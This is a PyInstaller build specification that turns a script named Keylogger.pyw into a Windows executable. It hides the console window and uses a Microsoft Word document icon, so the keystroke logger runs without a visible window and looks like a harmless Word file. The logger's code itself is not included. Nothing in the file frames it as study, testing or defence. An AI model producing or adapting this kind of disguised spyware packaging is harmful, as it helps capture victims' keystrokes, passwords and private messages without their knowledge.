# -*- mode: python -*-

block_cipher = None


a = Analysis(['C:\\Users\\josep\\Desktop\\Pythonecy\\Keylogger.pyw'],
             pathex=['C:\\Users\\josep\\Desktop\\Pythonecy'],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='Keylogger',
          debug=False,
          strip=False,
          upx=True,
          runtime_tmpdir=None,
          console=False , icon='C:\\Users\\josep\\Desktop\\Pythonecy\\Blackvariant-Button-Ui-Ms-Office-2016-Word-2.ico')
